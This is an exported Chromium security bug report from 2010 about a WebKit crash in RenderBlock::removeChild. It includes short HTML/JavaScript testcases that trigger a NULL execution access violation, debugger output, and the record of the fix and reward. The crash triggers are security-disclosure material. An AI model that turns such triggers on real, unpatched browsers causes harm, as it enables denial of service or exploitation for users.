# Regression: Incorrect destruction of "empty anonymous block" in renderblock remove child.

| Field | Value |
|-------|-------|
| **Issue ID** | [40082688](https://issues.chromium.org/issues/40082688) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ku...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2010-08-15 |
| **Bounty** | $1,000.00 |

## Description

tested 6.0.495.0 (56149)

testcase.htm
=========================
<button id="crash"> 
<lalala id="test"> 
</button> 
<script> 
crash.insertBefore(document.createElement("tbody"))
test.focus()
crash.outerHTML="1"
</script> 



(b9c.b94): Access violation - code c0000005 (!!! second chance !!!)
eax=00f1d7cc ebx=00f77902 ecx=00f1d630 edx=00000000 esi=00f1d630 edi=00000000
eip=00000000 esp=002becf8 ebp=002bed9c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
00000000 ??              ???
0:000> .exr -1
ExceptionAddress: 756dc9f1
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: 00000000
Attempt to execute non-executable address 00000000

## Timeline

### in...@chromium.org (2010-08-15)

Thanks Kuzzcc for the bug and reduced testcase. Looks to be some issue with incorrect destruction with renderobject nodes. I can see clear problems in debugger. testcase can be reduced furthur for more clarity as 

<button id="test"/>
<script>
    var button = document.getElementById("test");
    button.insertBefore(document.createElement("tbody"));
    document.body.offsetTop;
    document.body.removeChild(button);
</script>


### in...@chromium.org (2010-08-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-08-15)

Testcase from https://crbug.com/chromium/52239, just for tracking purposes.

<h1 id="crash"> 
<ruby> 
<test style="display:table-cell"></test> 
</ruby> 
</h1> 
<script> 
crash.outerHTML=""
</script> 

### in...@chromium.org (2010-08-15)

Does not reproduce on chrome v5 stable and safari v5 stable. I suspect it might be related to new tree builder. ccing Adam, Eric just in case.

### in...@chromium.org (2010-08-15)

Filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=44035.

### in...@chromium.org (2010-08-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-08-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-08-17)

Committed r65538: <http://trac.webkit.org/changeset/65538>

Needs to be merged to 472.

### sk...@chromium.org (2010-08-18)

FuzzFramework found this too:
[unknown] in WebCore::RenderObject::destroy ExecAV@NULL (13762f655a31bb7e9aef6538766198e4)
WebCore::RenderBlock::addChildIgnoringAnonymousColumnBlocks ReadAV@NULL (8861963c2158cde00d41e1ee9baea2f1)

If anybody ever says changes of multiple researchers finding the same bugs in the same time frame, please refer them to this bug.

### bu...@gmail.com (2010-08-19)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=56732 

------------------------------------------------------------------------
r56732 | inferno@chromium.org | 2010-08-19 13:14:25 -0700 (Thu, 19 Aug 2010) | 25 lines
Changed paths:
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/block/basic/empty-anonymous-block-remove-crash-expected.txt
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/block/basic/empty-anonymous-block-remove-crash.html
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/472/WebCore/rendering/RenderBlock.cpp?r1=56732&r2=56731

Merge 65538 - 2010-08-17  Abhishek Arya  <inferno@chromium.org>

        Reviewed by Dave Hyatt.

        Only destroy empty anonymous block when it is columns or column span block
        in RenderBlock::removeChild.
        https://bugs.webkit.org/show_bug.cgi?id=44035

        Test: fast/block/basic/empty-anonymous-block-remove-crash.html

        * rendering/RenderBlock.cpp:
        (WebCore::RenderBlock::removeChild):
2010-08-17  Abhishek Arya  <inferno@chromium.org>

        Reviewed by Dave Hyatt.

        Tests that removing an empty anonymous block does not result in crash.
        https://bugs.webkit.org/show_bug.cgi?id=44035

        * fast/block/basic/empty-anonymous-block-remove-crash-expected.txt: Added.
        * fast/block/basic/empty-anonymous-block-remove-crash.html: Added.

BUG=52204

Review URL: http://codereview.chromium.org/3136022
------------------------------------------------------------------------


### in...@chromium.org (2010-08-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-08-24)

@kuzzcc: congratulations again! This report provisionally qualifies for a $1000 Chromium Security Reward:
- Thank you for a simple testcase.html.
- Thank you for the .exr which clearly indicates an attempt to execute at NULL.

### ku...@gmail.com (2010-08-24)

Thank you 

### sc...@gmail.com (2010-09-02)

Never affected stable.
Paid.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/52204?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/52239]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082688)*
